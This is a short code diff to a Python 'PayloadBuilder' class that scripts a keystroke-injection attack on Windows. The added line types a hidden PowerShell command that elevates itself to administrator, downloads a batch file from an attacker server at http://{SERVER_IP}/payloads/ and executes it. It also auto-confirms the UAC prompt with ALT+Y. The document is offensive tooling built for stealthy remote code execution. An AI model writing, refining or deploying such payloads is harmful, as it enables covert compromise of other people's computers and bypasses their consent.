@@ -34,13 +34,10 @@ class PayloadBuilder:
         return [
             {'action': 'combo', 'keys': ['WIN', 'r']},
             {'action': 'delay', 'ms': 500},
-            {'action': 'type', 'text': 'powershell'},
+            {'action': 'type', 'text': f'powershell -w hidden -c "Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList \'-nop -w hidden -c iwr http://{{{{SERVER_IP}}}}/payloads/{bat_filename} -OutFile $env:TEMP\\p.bat; cmd /c $env:TEMP\\p.bat\'"'},
             {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
             {'action': 'delay', 'ms': 6000},
             {'action': 'combo', 'keys': ['ALT', 'y']},
-            {'action': 'delay', 'ms': 3000},
-            {'action': 'type', 'text': f'iwr http://{{{{SERVER_IP}}}}/payloads/{bat_filename} -o $env:TEMP\\p.bat; cmd /c $env:TEMP\\p.bat; exit'},
-            {'action': 'key', 'name': 'ENTER'},
         ]
 
     def _register_default_payloads(self):
